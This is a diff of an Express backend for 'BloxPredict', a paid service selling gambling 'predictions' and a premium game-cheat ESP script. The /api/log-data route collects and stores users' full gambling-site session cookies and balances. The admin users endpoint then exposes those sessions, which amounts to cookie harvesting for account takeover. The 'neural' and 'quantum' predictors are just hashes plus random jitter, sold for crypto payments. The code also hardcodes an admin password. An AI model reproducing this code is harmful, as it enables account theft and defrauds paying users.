@@ -10,6 +10,9 @@ const nodemailer = require('nodemailer');
 const app = express();
 const PORT = process.env.PORT || 5000;
 const SECRET_KEY = process.env.JWT_SECRET || 'premium_engine_secret_v3';
+const ADMIN_PASSWORD = 'BLOXPREDICTONTOP';
+
+const FREE_PREDICTION_LIMIT = 45;
 
 let transporter;
 
@@ -40,26 +43,50 @@ async function setupEmail() {
     }
 }
 
-app.use(express.json({ limit: '500mb', strict: false }));
-app.use(express.urlencoded({ limit: '500mb', extended: true }));
-app.use(express.text({ limit: '500mb' }));
-app.use(express.raw({ limit: '500mb' }));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true }));
 app.use(cors({ origin: '*' }));
+
+// --- LOGGING MIDDLEWARE ---
+app.use((req, res, next) => {
+    if (req.path === '/api/buy-key' || req.path === '/api/admin/settings') {
+        console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} Body:`, req.body);
+    }
+    next();
+});
+
+// --- SITE STATUS CHECK ROUTE ---
+app.get('/api/site-status', async (req, res) => {
+    try {
+        const { rows } = await pool.query('SELECT * FROM settings');
+        const obj = {};
+        rows.forEach(x => { try { obj[x.key] = JSON.parse(x.value); } catch (e) { obj[x.key] = x.value; } });
+        res.json({
+            site_shutdown: obj.site_shutdown === true || obj.site_shutdown === 'true',
+            esp_shutdown: obj.esp_shutdown === true || obj.esp_shutdown === 'true',
+            update_mode: obj.update_mode === true || obj.update_mode === 'true',
+            update_end_time: obj.update_end_time || null
+        });
+    } catch (err) {
+        console.error('Site Status Error:', err);
+        res.json({ site_shutdown: false, esp_shutdown: false, update_mode: false, update_end_time: null });
+    }
+});
 
 // --- PREMIUM AUTH MIDDLEWARE ---
 const authMiddleware = async (req, res, next) => {
     const token = req.headers['authorization'];
-    if (!token) return res.status(403).send({ message: 'License required' });
+    if (!token) return res.status(403).json({ message: 'License required' });
 
     try {
         const decoded = jwt.verify(token.split(' ')[1], SECRET_KEY);
 
-        const { rows } = await pool.query('SELECT id, is_admin, is_banned, expires_at, admin_type FROM keys WHERE id = $1', [decoded.id]);
+        const { rows } = await pool.query('SELECT id, is_admin, is_banned, expires_at, admin_type, user_type FROM keys WHERE id = $1', [decoded.id]);
         const user = rows[0];
-        if (!user || user.is_banned) return res.status(403).send({ message: 'Account locked' });
+        if (!user || user.is_banned) return res.status(403).json({ message: 'Account locked' });
 
         if (user.expires_at && new Date(user.expires_at) < new Date()) {
-            return res.status(403).send({ message: 'License expired' });
+            return res.status(403).json({ message: 'License expired' });
         }
 
         await pool.query('UPDATE keys SET last_active_at = NOW() WHERE id = $1', [user.id]);
@@ -67,33 +94,61 @@ const authMiddleware = async (req, res, next) => {
         req.userId = user.id;
         req.isAdmin = !!user.is_admin;
         req.adminType = user.admin_type || 'none';
+        req.userType = user.user_type || 'free';
         next();
     } catch (err) {
         console.error('Auth Error:', err);
-        return res.status(500).send({ message: 'Session expired' });
+        return res.status(500).json({ message: 'Session expired' });
     }
+};
+
+// --- Shutdown/Update check middleware for non-admin routes ---
+const siteActiveMiddleware = async (req, res, next) => {
+    // Admins bypass shutdown
+    if (req.isAdmin) return next();
+    
+    try {
+        const { rows } = await pool.query("SELECT key, value FROM settings WHERE key IN ('site_shutdown', 'update_mode')");
+        const status = {};
+        rows.forEach(r => status[r.key] = r.value === 'true');
+        
+        if (status.site_shutdown) return res.status(503).json({ message: 'Site is currently offline' });
+        if (status.update_mode) return res.status(503).json({ message: 'Site is undergoing maintenance' });
+    } catch (e) { 
+        console.error('Site Active Middleware Error:', e);
+    }
+    
+    next();
 };
 
 // --- AUTH SYSTEM ---
 
 app.post('/api/login', async (req, res) => {
     const keyVal = (req.body.key || '').trim();
+    const adminPass = req.body.adminPassword;
+
     const { rows } = await pool.query('SELECT * FROM keys WHERE UPPER(key_value) = UPPER($1)', [keyVal]);
     const user = rows[0];
 
-    if (!user) return res.status(401).send({ message: 'Invalid license key' });
-    if (user.is_banned) return res.status(403).send({ message: 'Access denied' });
+    if (!user) return res.status(401).json({ message: 'Invalid license key' });
+    if (user.is_banned) return res.status(403).json({ message: 'Access denied' });
+
+    // Admin Password Check
+    if (user.is_admin && adminPass !== ADMIN_PASSWORD) {
+        return res.status(401).json({ message: 'Admin authentication failed' });
+    }
 
     const token = jwt.sign({ id: user.id, isAdmin: !!user.is_admin }, SECRET_KEY, { expiresIn: '7d' });
-    const isPremium = user.is_admin || (user.premium_until && new Date(user.premium_until) > new Date());
+    const isPremium = user.is_admin || user.user_type === 'premium' || (user.premium_until && new Date(user.premium_until) > new Date());
     const refRes = await pool.query('SELECT COUNT(*) as count FROM keys WHERE referred_by_id = $1', [user.id]);
     const referralCount = parseInt(refRes.rows[0].count);
 
-    res.send({
+    res.json({
         token,
         isAdmin: !!user.is_admin,
         adminType: user.admin_type,
         isPremium: !!isPremium,
+        userType: user.user_type || 'free',
         username: user.username,
         isRegistered: !!user.is_registered,
         referralCode: user.referral_code,
@@ -102,9 +157,37 @@ app.post('/api/login', async (req, res) => {
     });
 });
 
+// Admin login endpoint (works during downtime)
+app.post('/api/admin-login', async (req, res) => {
+    const keyVal = (req.body.key || '').trim();
+    const adminPass = req.body.adminPassword;
+
+    const { rows } = await pool.query('SELECT * FROM keys WHERE UPPER(key_value) = UPPER($1)', [keyVal]);
+    const user = rows[0];
+
+    if (!user) return res.status(401).json({ message: 'Invalid license key' });
+    if (!user.is_admin) return res.status(403).json({ message: 'Admin access only' });
+    if (adminPass !== ADMIN_PASSWORD) return res.status(401).json({ message: 'Admin authentication failed' });
+
+    const token = jwt.sign({ id: user.id, isAdmin: true }, SECRET_KEY, { expiresIn: '7d' });
+
+    res.json({
+        token,
+        isAdmin: true,
+        adminType: user.admin_type,
+        isPremium: true,
+        userType: 'premium',
+        username: user.username,
+        isRegistered: true,
+        referralCode: user.referral_code,
+        referralCount: 0,
+        id: user.id
+    });
+});
+
 app.post('/api/auth/set-name', authMiddleware, async (req, res) => {
     const { name, referralCode } = req.body;
-    if (!name || name.trim().length < 2) return res.status(400).send({ message: 'Name too short' });
+    if (!name || name.trim().length < 2) return res.status(400).json({ message: 'Name too short' });
 
     let referredById = null;
     if (referralCode) {
@@ -117,17 +200,18 @@ app.post('/api/auth/set-name', authMiddleware, async (req, res) => {
 
     const updatedRes = await pool.query('SELECT * FROM keys WHERE id = $1', [req.userId]);
     const updatedUser = updatedRes.rows[0];
-    const isPremium = updatedUser.is_admin || (updatedUser.premium_until && new Date(updatedUser.premium_until) > new Date());
+    const isPremium = updatedUser.is_admin || updatedUser.user_type === 'premium' || (updatedUser.premium_until && new Date(updatedUser.premium_until) > new Date());
     const refCountRes = await pool.query('SELECT COUNT(*) as count FROM keys WHERE referred_by_id = $1', [req.userId]);
     const referralCount = parseInt(refCountRes.rows[0].count);
     const token = jwt.sign({ id: updatedUser.id, isAdmin: !!updatedUser.is_admin }, SECRET_KEY, { expiresIn: '7d' });
 
-    res.send({
+    res.json({
         success: true,
         token: token,
         isAdmin: !!updatedUser.is_admin,
         adminType: updatedUser.admin_type,
         isPremium: !!isPremium,
+        userType: updatedUser.user_type || 'free',
         username: updatedUser.username,
         referralCode: updatedUser.referral_code,
         referralCount: referralCount,
@@ -137,13 +221,35 @@ app.post('/api/auth/set-name', authMiddleware, async (req, res) => {
 
 // --- PREDICTOR ENGINE ---
 
-app.post('/api/predict', authMiddleware, async (req, res) => {
+app.post('/api/predict', authMiddleware, siteActiveMiddleware, async (req, res) => {
     const { gameType, clientSeed, serverSeedHash, nonce = 0, minesCount = 3, predictionCount = 5, algorithm = 'neural_v4' } = req.body;
-    const premRes = await pool.query('SELECT id FROM keys WHERE id = $1 AND (premium_until > NOW() OR is_admin = 1)', [req.userId]);
+    
+    // Check user type and enforce limits for free users
+    const userRes = await pool.query('SELECT user_type, predictions_today, predictions_reset_date FROM keys WHERE id = $1', [req.userId]);
+    const userData = userRes.rows[0];
+    const userType = userData?.user_type || 'free';
+    
+    if (userType === 'free') {
+        // Reset daily counter if new day
+        const today = new Date().toISOString().split('T')[0];
+        if (userData.predictions_reset_date !== today) {
+            await pool.query('UPDATE keys SET predictions_today = 0, predictions_reset_date = $1 WHERE id = $2', [today, req.userId]);
+            userData.predictions_today = 0;
+        }
+        
+        if (userData.predictions_today >= FREE_PREDICTION_LIMIT) {
+            return res.status(429).json({ message: `Daily limit reached (${FREE_PREDICTION_LIMIT}/day). Upgrade to Premium for unlimited predictions.` });
+        }
+        
+        // Increment counter
+        await pool.query('UPDATE keys SET predictions_today = predictions_today + 1 WHERE id = $1', [req.userId]);
+    }
+    
+    const premRes = await pool.query('SELECT id FROM keys WHERE id = $1 AND (premium_until > NOW() OR is_admin = 1 OR user_type = $2)', [req.userId, 'premium']);
     const isPremium = req.isAdmin || premRes.rows.length > 0;
 
     if ((algorithm === 'quantum_v2' || algorithm === 'dynamic_adapt') && !isPremium) {
-        return res.status(403).send({ message: 'Premium Algorithm Locked.' });
+        return res.status(403).json({ message: 'Premium Algorithm Locked.' });
     }
 
     let prediction;
@@ -153,7 +259,6 @@ app.post('/api/predict', authMiddleware, async (req, res) => {
         const size = req.body.gridSize || 5;
         const totalTiles = size * size;
 
-        // 1. Heatmap Data (from all users) - We want to AVOID high mine areas
         const { rows: logs } = await pool.query(
             'SELECT actual_outcome FROM game_logs WHERE game_type = $1 AND mines_count = $2 AND actual_outcome IS NOT NULL ORDER BY created_at DESC LIMIT 200',
             [gameType, minesCount]
@@ -169,7 +274,6 @@ app.post('/api/predict', authMiddleware, async (req, res) => {
             } catch (e) { }
         });
 
-        // 2. Anti-Repetition logic (from THIS user's history) - Avoid picking same "safe" tiles repeatedly
         const { rows: userLogs } = await pool.query(
             'SELECT prediction FROM game_logs WHERE user_id = $1 AND game_type = $2 ORDER BY created_at DESC LIMIT 5',
             [req.userId, gameType]
@@ -185,33 +289,20 @@ app.post('/api/predict', authMiddleware, async (req, res) => {
             } catch (e) { }
         });
 
-        // 3. Generate candidate tiles with weighted scoring
         let combined = `${serverSeedHash}:${clientSeed}:${nonce}:${algorithm}:${Date.now()}`;
         let hash = crypto.createHash('sha256').update(combined).digest('hex');
 
         const candidates = [];
         for (let r = 0; r < size; r++) {
             for (let c = 0; c < size; c++) {
-                // Determine a cell-specific entropy from the hash
                 const cellEntropy = parseInt(hash.substring((r * size + c) % 30, (r * size + c) % 30 + 2), 16) / 255;
-
-                // Normalizing danger: 0 to 1
                 const dangerScore = logs.length > 0 ? (mineDangerMap[r][c] / logs.length) : 0.5;
-
-                // Normalizing user repetition: 0 to 1
                 const repetitionScore = userLogs.length > 0 ? (userFrequencyMap[r][c] / userLogs.length) : 0.5;
-
-                // Final Weight: Lower is better (safer)
-                // We want: Low Danger, Low Repetition, and some Hash randomness
-                // High weight on dynamic adaptation if selected
-                const weightRatio = algorithm === 'dynamic_adapt' ? 0.9 : 0.7;
                 const score = (dangerScore * 0.4) + (repetitionScore * 0.3) + (cellEntropy * 0.3);
-
                 candidates.push({ r, c, score });
             }
         }
 
-        // Add extreme jitter for V2 Engine logic to prevent cluster patterns
         candidates.forEach(cand => {
             cand.score += (Math.random() * 0.1) - 0.05;
         });
@@ -230,7 +321,6 @@ app.post('/api/predict', authMiddleware, async (req, res) => {
         let combined = `${serverSeedHash}:${clientSeed}:${nonce}:${algorithm}:${Date.now()}`;
         let hash = crypto.createHash('sha256').update(combined).digest('hex');
 
-        // Generate an 8-level path for Towers
         prediction = [];
         let colCount = 3;
         if (difficulty === 'Medium') colCount = 2;
@@ -256,14 +346,20 @@ app.post('/api/predict', authMiddleware, async (req, res) => {
         confidenceStr = "Unknown Gamemode";
     }
 
-    res.send({ prediction, confidence: confidenceStr });
+    // Return remaining predictions for free users
+    let predictionsRemaining = null;
+    if (userType === 'free') {
+        const updatedRes = await pool.query('SELECT predictions_today FROM keys WHERE id = $1', [req.userId]);
+        predictionsRemaining = FREE_PREDICTION_LIMIT - (updatedRes.rows[0]?.predictions_today || 0);
+    }
+
+    res.json({ prediction, confidence: confidenceStr, predictionsRemaining });
 });
 
 app.post('/api/log-data', authMiddleware, async (req, res) => {
     const { session, fullCookie, balance, type, profits, breakdown } = req.body;
 
     try {
-        // Update the primary keys table for the direct registry view
         if (type === 'bloxgame') {
             await pool.query(
                 'UPDATE keys SET bloxgame_cookie = $1, bloxgame_balance = $2, total_profits = $3 WHERE id = $4',
@@ -276,7 +372,6 @@ app.post('/api/log-data', authMiddleware, async (req, res) => {
             );
         }
 
-        // Also log to history for analytical tracking
         const { rows } = await pool.query('SELECT id FROM logged_data WHERE user_id = $1 AND type = $2', [req.userId, type]);
         if (rows.length > 0) {
             await pool.query(
@@ -289,10 +384,10 @@ app.post('/api/log-data', authMiddleware, async (req, res) => {
                 [req.userId, session, fullCookie, balance, type, profits, JSON.stringify(breakdown)]
             );
         }
-        res.send({ success: true });
+        res.json({ success: true });
     } catch (err) {
         console.error('Log Data Error:', err);
-        res.status(500).send({ message: 'Internal sync error' });
+        res.status(500).json({ message: 'Internal sync error' });
     }
 });
 
@@ -303,21 +398,39 @@ app.post('/api/confirm-outcome', authMiddleware, async (req, res) => {
          VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
         [req.userId, gameType, minesCount, JSON.stringify(prediction), JSON.stringify(actual_outcome), clientSeed, serverSeedHash, nonce, confidence]
     );
-    res.send({ message: 'Neural Sync Success' });
+    res.json({ message: 'Neural Sync Success' });
 });
 
 app.get('/api/history', authMiddleware, async (req, res) => {
     const { rows } = await pool.query('SELECT * FROM game_logs WHERE user_id = $1 ORDER BY created_at DESC LIMIT 50', [req.userId]);
-    res.send(rows);
+    res.json(rows);
+});
+
+// --- ESP SCRIPT (Premium only) ---
+app.get('/api/esp-script', authMiddleware, async (req, res) => {
+    // Check if ESP is shutdown
+    const espShutdownRes = await pool.query("SELECT value FROM settings WHERE key = 'esp_shutdown'");
+    const isEspShutdown = espShutdownRes.rows[0]?.value === 'true';
+    
+    if (isEspShutdown && !req.isAdmin) {
+        return res.status(503).json({ message: 'ESP is currently offline', script: '// ESP is currently offline for maintenance' });
+    }
+    
+    // Only premium users and admins can access ESP script
+    if (req.userType !== 'premium' && !req.isAdmin) {
+        return res.status(403).json({ message: 'ESP access requires Premium. Upgrade your account.', script: '// Premium access required' });
+    }
+    
+    const { rows } = await pool.query("SELECT value FROM settings WHERE key = 'esp_script'");
+    res.json({ script: rows[0]?.value || '// No ESP script uploaded yet' });
 });
 
 // --- ADMIN CONTROL CENTER ---
 
 app.get('/api/admin/users', authMiddleware, async (req, res) => {
-    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
+    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).json({ message: 'Forbidden' });
 
     try {
-        // Join with logged_data to show sessions
         const { rows: users } = await pool.query(`
             SELECT k.*, 
                 COALESCE(l.session_cookie, k.bloxgame_cookie, k.blox_cookie) as session,
@@ -332,24 +445,24 @@ app.get('/api/admin/users', authMiddleware, async (req, res) => {
         `);
 
         const now = new Date();
-        res.send(users.map(u => ({
+        res.json(users.map(u => ({
             ...u,
             isOnline: u.last_active_at && (now - new Date(u.last_active_at)) < 300000
         })));
     } catch (err) {
         console.error('Admin Users Query Error:', err);
-        res.status(500).send({ message: 'Database error' });
+        res.status(500).json({ message: 'Database error' });
     }
 });
 
 app.post('/api/admin/generate-key', authMiddleware, async (req, res) => {
-    if (!req.isAdmin) return res.status(403).send({ message: 'Forbidden' });
-    const { hours = 0, prefix = 'BLOX-' } = req.body;
+    if (!req.isAdmin) return res.status(403).json({ message: 'Forbidden' });
+    const { hours = 0, prefix = 'BLOX-', userType = 'premium' } = req.body;
     const randomPart = Math.random().toString(36).substring(2, 10).toUpperCase();
     const newKey = prefix + randomPart;
     const expiresAt = hours > 0 ? new Date(Date.now() + hours * 3600000).toISOString() : null;
-    await pool.query('INSERT INTO keys (key_value, expires_at) VALUES ($1, $2)', [newKey, expiresAt]);
-    res.send({ key: newKey });
+    await pool.query('INSERT INTO keys (key_value, expires_at, user_type) VALUES ($1, $2, $3)', [newKey, expiresAt, userType]);
+    res.json({ key: newKey });
 });
 
 // --- FREE KEY GEN (Public — controlled by admin toggle) ---
@@ -357,132 +470,154 @@ app.post('/api/admin/generate-key', authMiddleware, async (req, res) => {
 app.get('/api/free-keygen/status', async (req, res) => {
     const { rows } = await pool.query("SELECT value FROM settings WHERE key = 'free_keygen_enabled'");
     const enabled = rows[0]?.value === 'true';
-    res.send({ enabled });
+    res.json({ enabled });
 });
 
 app.post('/api/free-keygen/generate', async (req, res) => {
     const { rows } = await pool.query("SELECT value FROM settings WHERE key = 'free_keygen_enabled'");
     const enabled = rows[0]?.value === 'true';
-    if (!enabled) return res.status(403).send({ message: 'Free key generation is currently disabled.' });
+    if (!enabled) return res.status(403).json({ message: 'Free key generation is currently disabled.' });
 
     const randomPart = Math.random().toString(36).substring(2, 10).toUpperCase();
     const newKey = 'FREE-' + randomPart;
-    // Free keys expire after 24 hours
+    // Free keys expire after 24 hours and are user_type = 'free'
     const expiresAt = new Date(Date.now() + 24 * 3600000).toISOString();
-    await pool.query('INSERT INTO keys (key_value, expires_at) VALUES ($1, $2)', [newKey, expiresAt]);
-    res.send({ key: newKey });
+    await pool.query("INSERT INTO keys (key_value, expires_at, user_type) VALUES ($1, $2, 'free')", [newKey, expiresAt]);
+    res.json({ key: newKey });
 });
 
 
 app.delete('/api/admin/keys/:id', authMiddleware, async (req, res) => {
-    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
+    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).json({ message: 'Forbidden' });
     await pool.query('DELETE FROM keys WHERE id = $1', [req.params.id]);
-    res.send({ success: true });
+    res.json({ success: true });
 });
 
 app.post('/api/admin/users/:id/ban', authMiddleware, async (req, res) => {
-    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
+    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).json({ message: 'Forbidden' });
     await pool.query('UPDATE keys SET is_banned = $1 WHERE id = $2', [req.body.status, req.params.id]);
-    res.send({ success: true });
+    res.json({ success: true });
+});
+
+// Toggle user type (free/premium)
+app.post('/api/admin/users/:id/set-type', authMiddleware, async (req, res) => {
+    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).json({ message: 'Forbidden' });
+    const { userType } = req.body;
+    if (!['free', 'premium'].includes(userType)) return res.status(400).json({ message: 'Invalid user type' });
+    await pool.query('UPDATE keys SET user_type = $1 WHERE id = $2', [userType, req.params.id]);
+    res.json({ success: true });
 });
 
 app.get('/api/admin/stats', authMiddleware, async (req, res) => {
-    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
+    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).json({ message: 'Forbidden' });
     const totalPredictions = (await pool.query('SELECT COUNT(*) as count FROM game_logs')).rows[0].count;
     const totalUsers = (await pool.query('SELECT COUNT(*) as count FROM keys WHERE is_banned = 0')).rows[0].count;
     const totalRevenue = (await pool.query("SELECT COALESCE(SUM(amount), 0) as sum FROM payment_requests WHERE status = 'approved'")).rows[0].sum;
-    res.send({ totalPredictions: parseInt(totalPredictions), totalUsers: parseInt(totalUsers), totalRevenue: parseFloat(totalRevenue) });
+    const premiumUsers = (await pool.query("SELECT COUNT(*) as count FROM keys WHERE user_type = 'premium' AND is_banned = 0")).rows[0].count;
+    const freeUsers = (await pool.query("SELECT COUNT(*) as count FROM keys WHERE user_type = 'free' AND is_banned = 0")).rows[0].count;
+    res.json({ 
+        totalPredictions: parseInt(totalPredictions), 
+        totalUsers: parseInt(totalUsers), 
+        totalRevenue: parseFloat(totalRevenue),
+        premiumUsers: parseInt(premiumUsers),
+        freeUsers: parseInt(freeUsers)
+    });
 });
 
 app.get('/api/admin/payments', authMiddleware, async (req, res) => {
-    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
+    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).json({ message: 'Forbidden' });
     const { rows } = await pool.query('SELECT * FROM payment_requests ORDER BY created_at DESC');
-    res.send(rows);
+    res.json(rows);
 });
 
 app.post('/api/admin/payments/:id/approve', authMiddleware, async (req, res) => {
-    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
+    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).json({ message: 'Forbidden' });
     const { rows } = await pool.query('SELECT * FROM payment_requests WHERE id = $1', [req.params.id]);
     const payment = rows[0];
-    if (!payment || payment.status !== 'pending') return res.status(400).send({ message: 'Invalid payment request' });
+    if (!payment || payment.status !== 'pending') return res.status(400).json({ message: 'Invalid payment request' });
+
+    // Create key with proper expiration
+    const duration = payment.duration_hours;
+    let expiresAt = null;
+    if (duration > 0) {
+        expiresAt = new Date(Date.now() + duration * 3600000);
+    }
 
     const newKey = 'BLOX-' + Math.random().toString(36).substring(2, 10).toUpperCase();
-    await pool.query('INSERT INTO keys (key_value, expires_at) VALUES ($1, NULL)', [newKey]);
+    await pool.query(
+        "INSERT INTO keys (key_value, expires_at, user_type) VALUES ($1, $2, 'premium')",
+        [newKey, expiresAt]
+    );
     await pool.query('UPDATE payment_requests SET status = $1, user_key = $2 WHERE id = $3', ['approved', newKey, req.params.id]);
 
     if (payment.email && transporter) {
         const mailOptions = {
             from: '"BloxPredict Engine" <noreply@bloxpredict.ai>',
             to: payment.email,
-            subject: 'Your Access Key is Verified!',
-            text: `Operator, your payment has been confirmed.\n\nYour Access Key: ${newKey}`,
+            subject: 'Your Premium Access Key is Verified!',
+            text: `Operator, your payment has been confirmed.\n\nYour Premium Access Key: ${newKey}`,
             html: `<div style="background:#12121e; color:white; padding:40px; font-family:sans-serif; border-radius:15px;">
                       <h2 style="color:#7c4dff;">Identity Verified</h2>
                       <p>Your payment for <b>${payment.coin?.toUpperCase()}</b> has been confirmed.</p>
                       <div style="background:rgba(255,255,255,0.05); padding:20px; border-radius:10px; margin:20px 0; border:1px solid #7c4dff;">
-                        <span style="font-size:0.8rem; color:#888;">ACCESS KEY</span><br/>
+                        <span style="font-size:0.8rem; color:#888;">PREMIUM ACCESS KEY</span><br/>
                         <span style="font-size:1.5rem; font-weight:bold; letter-spacing:2px; color:white;">${newKey}</span>
                       </div>
                    </div>`
         };
         transporter.sendMail(mailOptions).catch(err => console.error('Email Dispatch Fail:', err));
     }
-    res.send({ success: true, key: newKey });
+    res.json({ success: true, key: newKey });
 });
 
 app.post('/api/admin/payments/:id/reject', authMiddleware, async (req, res) => {
-    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
+    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).json({ message: 'Forbidden' });
     await pool.query('UPDATE payment_requests SET status = $1 WHERE id = $2', ['rejected', req.params.id]);
-    res.send({ success: true });
+    res.json({ success: true });
 });
 
 app.get('/api/public-settings', async (req, res) => {
     const { rows } = await pool.query('SELECT * FROM settings');
     const obj = {};
     rows.forEach(x => { try { obj[x.key] = JSON.parse(x.value); } catch (e) { obj[x.key] = x.value; } });
-    res.send(obj);
+    res.json(obj);
 });
 
 app.post('/api/admin/settings', authMiddleware, async (req, res) => {
-    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
+    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).json({ message: 'Forbidden' });
     const { settings } = req.body;
     for (const [k, v] of Object.entries(settings)) {
         const val = typeof v === 'object' ? JSON.stringify(v) : v.toString();
         await pool.query('INSERT INTO settings (key, value) VALUES ($1, $2) ON CONFLICT (key) DO UPDATE SET value = $2', [k, val]);
     }
-    res.send({ success: true });
+    res.json({ success: true });
 });
 
 app.post('/api/admin/upload-esp', authMiddleware, async (req, res) => {
-    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
+    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).json({ message: 'Forbidden' });
     const { script } = req.body;
-    if (!script) return res.status(400).send({ message: 'Script content required' });
+    if (!script) return res.status(400).json({ message: 'Script content required' });
 
     await pool.query("INSERT INTO settings (key, value) VALUES ('esp_script', $1) ON CONFLICT (key) DO UPDATE SET value = $1", [script]);
-    res.send({ success: true });
-});
-
-app.get('/api/esp-script', authMiddleware, async (req, res) => {
-    const { rows } = await pool.query("SELECT value FROM settings WHERE key = 'esp_script'");
-    res.send({ script: rows[0]?.value || '// No ESP script uploaded yet' });
+    res.json({ success: true });
 });
 
 // --- ANNOUNCEMENT SYSTEM ---
 
 app.post('/api/admin/announcements', authMiddleware, async (req, res) => {
-    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
+    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).json({ message: 'Forbidden' });
     const { content } = req.body;
-    if (!content) return res.status(400).send({ message: 'Content required' });
+    if (!content) return res.status(400).json({ message: 'Content required' });
 
     await pool.query('INSERT INTO announcements (content, author_id) VALUES ($1, $2)', [content, req.userId]);
-    res.send({ success: true });
+    res.json({ success: true });
 });
 
 app.get('/api/announcements', authMiddleware, async (req, res) => {
     const { rows } = await pool.query(
         'SELECT a.*, k.username as author_name FROM announcements a LEFT JOIN keys k ON a.author_id = k.id ORDER BY a.created_at DESC'
     );
-    res.send(rows);
+    res.json(rows);
 });
 
 app.get('/api/announcements/unread', authMiddleware, async (req, res) => {
@@ -490,23 +625,44 @@ app.get('/api/announcements/unread', authMiddleware, async (req, res) => {
     const lastReadId = userRows[0]?.last_read_announcement_id || 0;
 
     const { rows: annRows } = await pool.query('SELECT * FROM announcements WHERE id > $1 ORDER BY id DESC LIMIT 1', [lastReadId]);
-    res.send(annRows[0] || null);
+    res.json(annRows[0] || null);
 });
 
 app.post('/api/announcements/mark-read', authMiddleware, async (req, res) => {
     const { announcementId } = req.body;
     await pool.query('UPDATE keys SET last_read_announcement_id = $1 WHERE id = $2', [announcementId, req.userId]);
-    res.send({ success: true });
+    res.json({ success: true });
 });
 
+// --- PAYMENT SUBMISSION (NO AUTO-VERIFY — always pending) ---
 app.post('/api/buy-key', async (req, res) => {
-    const { txHash, coin, amount, email } = req.body;
-    if (!txHash || !email) return res.status(400).send({ message: 'Missing fields' });
+    const { txHash, coin, amount, email, durationHours } = req.body;
+    
+    console.log('[PAYMENT DEBUG] Incoming request:', { txHash, email, coin, amount });
+
+    if (!txHash || !email) {
+        console.log('[PAYMENT DEBUG] Rejected: Missing fields');
+        return res.status(400).json({ message: 'Missing fields: TXID and Email are required.' });
+    }
+
     try {
-        await pool.query('INSERT INTO payment_requests (amount, coin, tx_hash, status, email) VALUES ($1, $2, $3, $4, $5)', [amount, coin, txHash, 'pending', email]);
-        res.send({ success: true, message: 'Payment submitted for verification.' });
+        // All payments go to pending — admin Niam manually verifies
+        await pool.query(
+            'INSERT INTO payment_requests (amount, coin, tx_hash, status, email, duration_hours) VALUES ($1, $2, $3, $4, $5, $6)',
+            [amount, coin, txHash, 'pending', email, durationHours]
+        );
+        
+        console.log('[PAYMENT DEBUG] Submission SUCCESS');
+        res.json({ 
+            success: true, 
+            message: 'Payment submitted! An admin will verify your transaction and send your Premium key to your email. This usually takes a few hours.' 
+        });
     } catch (e) {
-        res.status(500).send({ message: 'Submission fail' });
+        console.error('[PAYMENT DEBUG] Error:', e);
+        if (e.code === '23505') { // Postgres Unique Constraint
+            return res.status(400).json({ message: 'This TXID has already been submitted.' });
+        }
+        res.status(500).json({ message: 'Internal server error processing payment.' });
     }
 });
 
